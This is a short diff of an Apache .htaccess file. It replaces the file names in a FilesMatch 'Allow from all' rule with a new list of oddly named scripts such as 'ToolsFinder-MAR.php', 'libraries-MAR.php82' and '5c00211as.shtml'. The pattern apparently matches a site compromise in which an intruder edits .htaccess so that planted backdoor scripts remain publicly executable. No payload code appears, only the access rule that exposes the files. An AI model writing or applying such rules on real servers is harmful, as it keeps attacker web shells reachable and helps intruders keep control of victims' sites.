@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(json.php|ExceptionInterface.php|ToolsFinder.php|listbuilder.php|ThemeSettings.php|IPV6String.php|framework.php|Visitor.php|TermwindServiceSetting.php|TermwindServiceVendor.php)$">
+<FilesMatch "^(ToolsFinder-MAR.php|jsonpretty-MAR.shtml|libraries-MAR.php82|capability.php|preferInputWidthMainContent.php82|settingsForm.tpl.php|5c00211as.shtml|Exception.php|StatsSkinHandler.inc.php|ProfileSettingsForm.inc.php|InvalidException.php|FieldMediaField.php|Json.php|regeneratePHP5.php|ExceptionInterfaceForm.php|article_details.less.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
